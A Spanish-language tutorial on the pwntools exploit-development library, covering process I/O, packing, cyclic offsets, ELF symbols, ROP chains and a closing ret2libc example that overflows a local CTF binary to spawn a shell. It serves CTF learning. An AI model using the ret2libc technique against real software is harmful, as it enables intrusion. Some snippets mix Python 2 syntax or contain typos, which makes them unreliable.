# TUTORIAL PWNTOOLS

<a name="pwntools"></a>
## ¿QUE ES PWNTOOLS? 

Pwntools es un marco CTF y una biblioteca de desarrollo de exploits. Escrito en Python, está diseñado para el desarrollo y la creación de prototipos rápidos, y tiene la intención de hacer que la escritura de exploits sea lo más simple posible.

## INSTALACION <a name="instalacion"></a>

```
apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```

```
sudo pip3 install pwn
```

## IMPORTACION <a name="importacion"></a>

```
# importacion

from pwn import *

```

## ASOCIAR UN BINARIO O SERVICIO <a name="asociacion"></a>

```
# en caso de explotar un servicio remoto

target = remote("github.com", 9000)

# en caso de ser un archivo local

target = process("./data")

# si queremos adjuntar el gdb a un proceso

gdb.attach(target)

# en caso de adjuntar a gdb asi podemos mandar comandos de gdb

gdb.attach(target, gdbscript='b *main')

```

## ENVIO DE DATOS AL BINARIO <a name="envio"></a>

```
# enviar un parametro o valor al binario

target.send(value)

# si queremos enviar algo y que tenga al finala un \n usamos

target.sendline(x)

```

## RETORNO DE DATOS <a name="retorno"></a>

```
# recibir cualquier cantidad de bytes disponibles

print target.recv(bytes)

# Recibir datos hasta que se encuentre una nueva línea \n

print target.recvline()

# Recibir datos hasta que se encuentre un delimitador

print target.recvuntil("delimitador")

# Recibir datos hasta que se satisfaga un patrón de expresiones regulares

print target.recvregex(patron)

# Seguir recibiendo datos hasta que se agote el tiempo de espera (segundos)

print target.recvrepeat(segundos)

# descartar todos los datos almacenados en el buffer

clean()
```

## SESIONES INTERACTIVAS <a name="sesiones"></a>

Mas que todo nos permite interactuar con el proceso de modo que al obtener un shell reverse de nos lo abra como una shell

```
target.interactive()
```

## conversion a little endian <a name="conversiones"></a>
Esto es basicamente el pack del struct que usabamos en los binarios:

```
# conversion para 64 bits

p64(0x0814254)

# conversion para 32 bits

p32(0x08124578)

# lo inverso en 64 bits

u64(\x54\x42\x81\x80)

# lo inverso para 32 bits

u32(\x54\x42\x81\x80)

```

Ejemplos:

```
pack(1)
# '\x01\x00\x00\x00'

pack(-1)
# '\xff\xff\xff\xff'

pack(2**32 - 1)
# '\xff\xff\xff\xff'


# en big endian
pack(1, endian='big')
# '\x00\x00\x00\x01'

p16(1)
# '\x01\x00'

# formato hexadecimal

hex(unpack('AAAA'))
# '0x41414141'

hex(u16('AA'))
# '0x4141'
```

## I/O DE ARCHIVOS <a name="archivos"></a>

```
from pwn import \*

write('filename', 'data')
read('filename')
\# 'data'
read('filename', 1)
\# 'd'
```

## ENCODING AND DECODING <a name="cifrado"></a>

```
# BASE 64

'hello' == b64d(b64e('hello'))

# HASHES

md5sumhex('hello') == '5d41402abc4b2a76b9719d911017c592'
md5filehex('file') == '5d41402abc4b2a76b9719d911017c592'
sha1sumhex('hello') == 'aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d'

# HEXADECIMAL ENCODING

enhex('hello')
# '68656c6c6f'
unhex('776f726c64')
# 'world'

# MANIPULACION DE BITS

bits(0b1000001) == bits('A')
# [0, 0, 0, 1, 0, 1, 0, 1]
unbits([0,1,0,1,0,1,0,1])
# 'U'

```

## PATTERN CREATE <a name="patrones"></a>

la funcionalidad que realizabamos con pattern create o pattern arg:

```
# uso de cyclic

# envio de 512 bytes aleatorios

io = process(...)
io.send(cyclic(512))

# encontrando offset

cyclic_find(0x61616178)
# 92

```

## DEFINIENDO EL CONTEXTO <a name="contexto"></a>

```
# arquitextura

from pwn import *
context.arch = 'amd64'

# opciones

aarch64 - amd64 - i386 - arm 

# por defecto esta i386


```

## EXECUTABLE LINUX FILE (ELF) <a name="elf"></a>

```
# seteando elf

e = ELF('/bin/bash')

# \[*] '/bin/bash' 
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      No PIE
#     FORTIFY:  Enabled

# usando simbolos (symbols)

ELF.symbols -> enumera todos los símbolos conocidos, incluidos los siguientes. Se da preferencia a las entradas PLT sobre las entradas GOT.
ELF.got -> solo contiene entradas GOT
ELF.plt -> solo contiene entradas PLT
ELF.functions ->lo contiene funciones (requiere símbolos DWARF)



print "%#x -> license" % e.symbols['bash_icense']
print "%#x -> execve" % e.symbols['execve']
print "%#x -> got.execve" % e.got['execve']
print "%#x -> plt.execve" % e.plt['execve']
print "%#x -> list\_all\_jobs" % e.functions['list_all_jobs'].address

# salida

0x4ba738 -> license
0x41db60 -> execve
0x6f0318 -> got.execve
0x41db60 -> plt.execve
0x446420 -> list_all_jobs

```

## cambio de la direccion base <a name="base"></a>

```
from pwn import *

e = ELF('/bin/bash')

print "%#x -> base address" % e.address
print "%#x -> entry point" % e.entry
print "%#x -> execve" % e.symbols['execve']

print "---"
e.address = 0x12340000

print "%#x -> base address" % e.address
print "%#x -> entry point" % e.entry
print "%#x -> execve" % e.symbols['execve']

# salida

0x400000 -> base address
0x42020b -> entry point
0x41db60 -> execve
---
0x12340000 -> base address
0x1236020b -> entry point
0x1235db60 -> execve

```

## busqueda de direcciones <a name="busqueda"></a>

```
from pwn import *

e = ELF('/bin/bash')

for address in e.search('/bin/sh\x00'):
    print hex(address)
	
# salida

0x420b82
0x420c5e

```

## assembly casting <a name="assembly"></a>

```
from pwn import *

print repr(asm('xor edi, edi'))
# '1\xff'

print enhex(asm('xor edi, edi'))
# 31ff

```

## ROP GADGETS <a name="rop"></a>

```

elf = ELF('/bin/sh')
rop = ROP(elf)

# er todos los gadgets

rop.gadgets

# crear cadenas rop

rop.raw(0xdeadbeef)
rop.raw(0xcafebabe)
rop.raw('asdf')

# ver la cadena rop

print(rop.dump())

# mandar la cadena

target.sendline(rop.chain())

```

## EJEMPLOS <a name="ejemplos"></a>

### RET2LIBC

```
#!/usr/bin/python3

from pwn import *
from struct import pack

p = gdb.debug('./pwn1', '''
	b *0x400716
	c
''')
binary = ELF('./pwn1')
context.binary = binary
rop = ROP(binary)
libc = ELF('libc.so.6')
p.recvuntil("buffer:")

libc.address = 0x00007ffff7dc8000
rop.raw("A" * 72)
rop.raw(0x400783) # pop_rdi address
rop.raw(next(libc.search(b'/bin/sh'))) # target libc
rop.raw(libc.symbols['system'])

p.sendline(rop.chain())
p.interactive()

```